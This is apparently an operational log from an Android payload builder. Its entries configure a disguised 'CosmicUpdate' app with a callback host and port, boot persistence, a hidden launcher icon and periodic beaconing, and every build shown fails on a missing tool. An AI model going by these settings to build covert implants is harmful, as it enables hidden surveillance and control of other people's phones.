+[2026-03-06 19:20:47] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:20:59] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:21:28] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:21:40] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:21:51] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:21:52] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:24:08] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:24:08] INFO: Starting APK generation {"lhost":"10.13.1.174","lport":4444,"app_name":"CosmicUpdate","package_name":"com.cosmic.update","persistence":"boot","disguise":true,"hide_icon":true,"beacon_interval":60,"use_encryption":false}
+[2026-03-06 19:24:09] DEBUG: Config injected {"file":"\/tmp\/cosmic_android_69ab29d8ce5566.34307975\/app\/src\/main\/java\/com\/cosmic\/Config.java"}
+[2026-03-06 19:24:09] DEBUG: Launcher icon hidden []
+[2026-03-06 19:24:09] DEBUG: Executing command {"cmd":"'\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt' package -f -m -J '\/tmp\/cosmic_android_69ab29d8ce5566.34307975\/gen' -M '\/tmp\/cosmic_android_69ab29d8ce5566.34307975\/AndroidManifest.xml' -S '\/tmp\/cosmic_android_69ab29d8ce5566.34307975\/res' -I '\/home\/kali\/android-sdk\/platforms\/android-33\/android.jar'"}
+[2026-03-06 19:24:09] ERROR: aapt compilation failed {"output":["sh: 1: \/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt: not found"]}
+[2026-03-06 19:24:09] ERROR: APK generation failed {"error":"aapt compilation failed\nsh: 1: \/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt: not found"}
+[2026-03-06 19:24:10] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:24:25] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:24:26] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:24:31] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:24:44] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:24:59] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:25:24] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:31:00] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:33:33] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:33:53] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:33:58] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:34:16] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:34:28] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:34:30] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:34:38] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:34:44] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:34:51] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-06 19:34:53] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 13:51:04] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 13:51:14] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 13:51:33] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 13:53:48] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 13:53:48] INFO: Starting APK generation {"lhost":"127.0.0.1","lport":4444,"app_name":"Test","package_name":"com.cosmic.update","persistence":"boot","disguise":false,"hide_icon":false,"beacon_interval":60,"use_encryption":false}
+[2026-03-09 13:53:48] DEBUG: Config injected {"file":"\/tmp\/cosmic_android_69aed0ec249441.73378197\/app\/src\/main\/java\/com\/cosmic\/Config.java"}
+[2026-03-09 13:53:48] DEBUG: Executing command {"cmd":"'\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt' package -f -m -J '\/tmp\/cosmic_android_69aed0ec249441.73378197\/gen' -M '\/tmp\/cosmic_android_69aed0ec249441.73378197\/AndroidManifest.xml' -S '\/tmp\/cosmic_android_69aed0ec249441.73378197\/res' -I '\/home\/kali\/android-sdk\/platforms\/android-33\/android.jar'"}
+[2026-03-09 13:53:48] ERROR: aapt compilation failed {"output":["sh: 1: \/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt: not found"]}
+[2026-03-09 13:53:48] ERROR: APK generation failed {"error":"aapt compilation failed\nsh: 1: \/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt: not found"}
+[2026-03-09 13:57:49] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:02:05] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:02:08] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:02:17] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:02:25] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:02:51] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:02:52] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:02:55] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:02:58] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:02:59] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:06:03] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:06:16] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:06:20] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:07:06] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:07:09] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:07:17] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:07:54] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:07:59] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:08:08] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:08:23] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:08:24] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:08:28] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:08:29] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:09:53] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:18:48] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:22:01] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:22:01] INFO: Starting APK generation {"lhost":"127.0.0.1","lport":4444,"app_name":"Test","package_name":"com.cosmic.update","persistence":"boot","disguise":false,"hide_icon":false,"beacon_interval":60,"use_encryption":false}
+[2026-03-09 14:22:02] DEBUG: Config injected {"file":"\/tmp\/cosmic_android_69aed789ee8170.29440092\/app\/src\/main\/java\/com\/cosmic\/Config.java"}
+[2026-03-09 14:22:02] DEBUG: Executing command {"cmd":"'\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt' package -f -m -J '\/tmp\/cosmic_android_69aed789ee8170.29440092\/gen' -M '\/tmp\/cosmic_android_69aed789ee8170.29440092\/AndroidManifest.xml' -S '\/tmp\/cosmic_android_69aed789ee8170.29440092\/res' -I '\/home\/kali\/android-sdk\/platforms\/android-33\/android.jar'"}
+[2026-03-09 14:22:02] ERROR: aapt compilation failed {"output":["sh: 1: \/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt: not found"]}
+[2026-03-09 14:22:02] ERROR: APK generation failed {"error":"aapt compilation failed\nsh: 1: \/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt: not found"}
+[2026-03-09 14:22:43] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:22:44] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:22:49] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:22:50] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:25:56] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:25:57] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:26:41] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:26:42] INFO: Prerequisites satisfied {"aapt":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt","apksigner":"\/home\/kali\/android-sdk\/build-tools\/34.0.0\/apksigner"}
+[2026-03-09 14:28:10] ERROR: Missing prerequisites {"missing":["dx"]}
+[2026-03-09 14:30:03] ERROR: Missing prerequisites {"missing":["dx"]}
+[2026-03-09 14:30:07] ERROR: Missing prerequisites {"missing":["dx"]}
+[2026-03-09 14:33:50] INFO: Prerequisites satisfied []
+[2026-03-09 14:33:51] INFO: Prerequisites satisfied []
+[2026-03-09 14:34:04] INFO: Prerequisites satisfied []
+[2026-03-09 14:37:35] INFO: Prerequisites satisfied []
+[2026-03-09 14:37:35] INFO: Starting APK generation {"lhost":"127.0.0.1","lport":4444,"app_name":"Test","package_name":"com.cosmic.update","persistence":"boot","disguise":false,"hide_icon":false,"beacon_interval":60,"use_encryption":false,"type":"android_custom"}
+[2026-03-09 14:37:35] DEBUG: Config injected {"file":"\/tmp\/cosmic_android_69aedb2fa26293.63790722\/app\/src\/main\/java\/com\/cosmic\/Config.java"}
+[2026-03-09 14:37:35] DEBUG: Executing command {"cmd":"'\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt' package -f -m -J '\/tmp\/cosmic_android_69aedb2fa26293.63790722\/gen' -M '\/tmp\/cosmic_android_69aedb2fa26293.63790722\/AndroidManifest.xml' -S '\/tmp\/cosmic_android_69aedb2fa26293.63790722\/res' -I '\/home\/kali\/android-sdk\/platforms\/android-33\/android.jar'"}
+[2026-03-09 14:37:35] ERROR: aapt compilation failed {"output":["sh: 1: \/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt: not found"]}
+[2026-03-09 14:37:35] ERROR: APK generation failed {"error":"aapt compilation failed\nsh: 1: \/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt: not found"}
+[2026-03-09 14:37:47] INFO: Prerequisites satisfied []
+[2026-03-09 14:37:49] INFO: Prerequisites satisfied []
+[2026-03-09 14:37:51] INFO: Prerequisites satisfied []
+[2026-03-09 14:37:52] INFO: Prerequisites satisfied []
+[2026-03-09 14:38:43] INFO: Prerequisites satisfied []
+[2026-03-09 14:38:43] INFO: Starting APK generation {"lhost":"192.168.0.133","lport":4444,"app_name":"CosmicUpdate","package_name":"com.cosmic.update","persistence":"boot","disguise":true,"hide_icon":true,"beacon_interval":60,"use_encryption":false}
+[2026-03-09 14:38:43] DEBUG: Config injected {"file":"\/tmp\/cosmic_android_69aedb73ac04a6.65248261\/app\/src\/main\/java\/com\/cosmic\/Config.java"}
+[2026-03-09 14:38:43] DEBUG: Launcher icon hidden []
+[2026-03-09 14:38:43] DEBUG: Executing command {"cmd":"'\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt' package -f -m -J '\/tmp\/cosmic_android_69aedb73ac04a6.65248261\/gen' -M '\/tmp\/cosmic_android_69aedb73ac04a6.65248261\/AndroidManifest.xml' -S '\/tmp\/cosmic_android_69aedb73ac04a6.65248261\/res' -I '\/home\/kali\/android-sdk\/platforms\/android-33\/android.jar'"}
+[2026-03-09 14:38:43] ERROR: aapt compilation failed {"output":["sh: 1: \/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt: not found"]}
+[2026-03-09 14:38:43] ERROR: APK generation failed {"error":"aapt compilation failed\nsh: 1: \/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt: not found"}
+[2026-03-09 14:38:44] INFO: Prerequisites satisfied []
+[2026-03-09 14:41:21] INFO: Prerequisites satisfied []
+[2026-03-09 14:41:21] INFO: Starting APK generation {"lhost":"127.0.0.1","lport":4444,"app_name":"Test","package_name":"com.cosmic.update","persistence":"boot","disguise":false,"hide_icon":false,"beacon_interval":60,"use_encryption":false,"type":"android_custom"}
+[2026-03-09 14:41:21] DEBUG: Config injected {"file":"\/tmp\/cosmic_android_69aedc1174e3f2.72046800\/app\/src\/main\/java\/com\/cosmic\/Config.java"}
+[2026-03-09 14:41:21] DEBUG: Executing command {"cmd":"'\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt' package -f -m -J '\/tmp\/cosmic_android_69aedc1174e3f2.72046800\/gen' -M '\/tmp\/cosmic_android_69aedc1174e3f2.72046800\/AndroidManifest.xml' -S '\/tmp\/cosmic_android_69aedc1174e3f2.72046800\/res' -I '\/home\/kali\/android-sdk\/platforms\/android-33\/android.jar'"}
+[2026-03-09 14:41:21] ERROR: aapt compilation failed {"output":["sh: 1: \/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt: not found"]}
+[2026-03-09 14:41:21] ERROR: APK generation failed {"error":"aapt compilation failed\nsh: 1: \/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt: not found"}
+[2026-03-09 14:41:36] INFO: Prerequisites satisfied []
+[2026-03-09 14:41:36] INFO: Starting APK generation {"lhost":"192.168.0.133","lport":4444,"app_name":"CosmicUpdate","package_name":"com.cosmic.update","persistence":"boot","disguise":true,"hide_icon":true,"beacon_interval":60,"use_encryption":false}
+[2026-03-09 14:41:36] DEBUG: Config injected {"file":"\/tmp\/cosmic_android_69aedc206f6078.91687781\/app\/src\/main\/java\/com\/cosmic\/Config.java"}
+[2026-03-09 14:41:36] DEBUG: Launcher icon hidden []
+[2026-03-09 14:41:36] DEBUG: Executing command {"cmd":"'\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt' package -f -m -J '\/tmp\/cosmic_android_69aedc206f6078.91687781\/gen' -M '\/tmp\/cosmic_android_69aedc206f6078.91687781\/AndroidManifest.xml' -S '\/tmp\/cosmic_android_69aedc206f6078.91687781\/res' -I '\/home\/kali\/android-sdk\/platforms\/android-33\/android.jar'"}
+[2026-03-09 14:41:36] ERROR: aapt compilation failed {"output":["sh: 1: \/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt: not found"]}
+[2026-03-09 14:41:36] ERROR: APK generation failed {"error":"aapt compilation failed\nsh: 1: \/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt: not found"}
+[2026-03-09 14:41:37] INFO: Prerequisites satisfied []
+[2026-03-09 14:41:58] INFO: Prerequisites satisfied []
+[2026-03-09 14:41:58] INFO: Starting APK generation {"lhost":"192.168.0.133","lport":4444,"app_name":"CosmicUpdate","package_name":"com.cosmic.update","persistence":"boot","disguise":true,"hide_icon":true,"beacon_interval":60,"use_encryption":true}
+[2026-03-09 14:41:58] DEBUG: Config injected {"file":"\/tmp\/cosmic_android_69aedc360269f5.04165319\/app\/src\/main\/java\/com\/cosmic\/Config.java"}
+[2026-03-09 14:41:58] DEBUG: Launcher icon hidden []
+[2026-03-09 14:41:58] DEBUG: Executing command {"cmd":"'\/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt' package -f -m -J '\/tmp\/cosmic_android_69aedc360269f5.04165319\/gen' -M '\/tmp\/cosmic_android_69aedc360269f5.04165319\/AndroidManifest.xml' -S '\/tmp\/cosmic_android_69aedc360269f5.04165319\/res' -I '\/home\/kali\/android-sdk\/platforms\/android-33\/android.jar'"}
+[2026-03-09 14:41:58] ERROR: aapt compilation failed {"output":["sh: 1: \/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt: not found"]}
+[2026-03-09 14:41:58] ERROR: APK generation failed {"error":"aapt compilation failed\nsh: 1: \/home\/kali\/android-sdk\/build-tools\/34.0.0\/aapt: not found"}
+[2026-03-09 14:41:59] INFO: Prerequisites satisfied []
+[2026-03-09 14:42:11] INFO: Prerequisites satisfied []
+[2026-03-09 14:42:12] INFO: Prerequisites satisfied []
+[2026-03-09 14:42:13] INFO: Prerequisites satisfied []
+[2026-03-09 14:42:14] INFO: Prerequisites satisfied []
+[2026-03-09 14:42:15] INFO: Prerequisites satisfied []
+[2026-03-09 14:42:17] INFO: Prerequisites satisfied []
+[2026-03-09 14:42:21] INFO: Prerequisites satisfied []
+[2026-03-09 14:42:22] INFO: Prerequisites satisfied []
+[2026-03-09 14:42:28] INFO: Prerequisites satisfied []
+[2026-03-09 14:44:33] INFO: Prerequisites satisfied []
+[2026-03-09 14:44:35] INFO: Prerequisites satisfied []
+[2026-03-09 14:44:41] INFO: Prerequisites satisfied []
+[2026-03-09 14:44:42] INFO: Prerequisites satisfied []
+[2026-03-09 14:45:18] INFO: Prerequisites satisfied []
+[2026-03-09 14:45:19] INFO: Prerequisites satisfied []
+[2026-03-09 14:52:25] INFO: Prerequisites satisfied []
+[2026-03-09 14:52:26] INFO: Prerequisites satisfied []
+[2026-03-09 14:52:27] INFO: Prerequisites satisfied []
+[2026-03-09 14:52:28] INFO: Prerequisites satisfied []
+[2026-03-09 14:52:34] INFO: Prerequisites satisfied []
+[2026-03-09 14:54:49] INFO: Prerequisites satisfied []
+[2026-03-09 14:56:30] INFO: Prerequisites satisfied []
+[2026-03-09 14:56:32] INFO: Prerequisites satisfied []
+[2026-03-09 14:56:33] INFO: Prerequisites satisfied []
+[2026-03-09 14:58:43] INFO: Prerequisites satisfied []
+[2026-03-09 14:58:44] INFO: Prerequisites satisfied []
+[2026-03-09 14:58:55] INFO: Prerequisites satisfied []
+[2026-03-09 15:01:14] INFO: Prerequisites satisfied []
+[2026-03-09 15:02:17] INFO: Prerequisites satisfied []
+[2026-03-09 15:08:21] INFO: Prerequisites satisfied []
+[2026-03-09 15:47:23] INFO: Prerequisites satisfied []
+[2026-03-09 15:48:46] INFO: Prerequisites satisfied []
+[2026-03-09 15:51:19] INFO: Prerequisites satisfied []
+[2026-03-09 15:51:49] INFO: Prerequisites satisfied []
+[2026-03-09 15:52:37] INFO: Prerequisites satisfied []
+[2026-03-09 15:52:44] INFO: Prerequisites satisfied []
+[2026-03-09 15:52:53] INFO: Prerequisites satisfied []
+[2026-03-09 15:52:59] INFO: Prerequisites satisfied []
+[2026-03-09 15:53:16] INFO: Prerequisites satisfied []
+[2026-03-09 15:53:21] INFO: Prerequisites satisfied []
+[2026-03-09 15:53:28] INFO: Prerequisites satisfied []
+[2026-03-09 15:53:36] INFO: Prerequisites satisfied []
+[2026-03-09 15:53:54] INFO: Prerequisites satisfied []
+[2026-03-09 15:54:06] INFO: Prerequisites satisfied []
+[2026-03-09 15:54:38] INFO: Prerequisites satisfied []
+[2026-03-09 15:55:03] INFO: Prerequisites satisfied []
+[2026-03-09 15:55:15] INFO: Prerequisites satisfied []
+[2026-03-09 15:55:31] INFO: Prerequisites satisfied []
+[2026-03-09 15:55:38] INFO: Prerequisites satisfied []
+[2026-03-09 15:55:53] INFO: Prerequisites satisfied []
+[2026-03-09 15:55:56] INFO: Prerequisites satisfied []
+[2026-03-10 15:47:26] INFO: Prerequisites satisfied []
+[2026-03-10 15:48:39] INFO: Prerequisites satisfied []
+[2026-03-10 15:48:41] INFO: Prerequisites satisfied []
+[2026-03-10 15:49:23] INFO: Prerequisites satisfied []
+[2026-03-10 15:49:36] INFO: Prerequisites satisfied []
+[2026-03-10 15:49:43] INFO: Prerequisites satisfied []
+[2026-03-10 15:50:17] INFO: Prerequisites satisfied []
+[2026-03-10 15:50:26] INFO: Prerequisites satisfied []
+[2026-03-10 15:50:48] INFO: Prerequisites satisfied []
+[2026-03-10 15:51:04] INFO: Prerequisites satisfied []
+[2026-03-10 15:53:11] INFO: Prerequisites satisfied []
+[2026-03-10 15:53:26] INFO: Prerequisites satisfied []
+[2026-03-10 15:54:42] INFO: Prerequisites satisfied []
+[2026-03-10 15:54:54] INFO: Prerequisites satisfied []
+[2026-03-10 15:55:41] INFO: Prerequisites satisfied []
+[2026-03-10 15:56:19] INFO: Prerequisites satisfied []
+[2026-03-10 15:57:12] INFO: Prerequisites satisfied []
+[2026-03-10 15:57:24] INFO: Prerequisites satisfied []
+[2026-03-10 15:58:24] INFO: Prerequisites satisfied []
+[2026-03-10 15:58:32] INFO: Prerequisites satisfied []
+[2026-03-10 15:58:39] INFO: Prerequisites satisfied []
+[2026-03-10 15:58:42] INFO: Prerequisites satisfied []
+[2026-03-10 15:58:46] INFO: Prerequisites satisfied []
+[2026-03-10 15:59:05] INFO: Prerequisites satisfied []
+[2026-03-10 15:59:22] INFO: Prerequisites satisfied []
+[2026-03-10 15:59:33] INFO: Prerequisites satisfied []
+[2026-03-10 20:19:05] INFO: Prerequisites satisfied []
+[2026-03-10 20:19:42] INFO: Prerequisites satisfied []
+[2026-03-10 20:25:27] INFO: Prerequisites satisfied []
+[2026-03-10 20:56:44] INFO: Prerequisites satisfied []
+[2026-03-10 20:57:33] INFO: Prerequisites satisfied []
+[2026-03-10 20:57:45] INFO: Prerequisites satisfied []
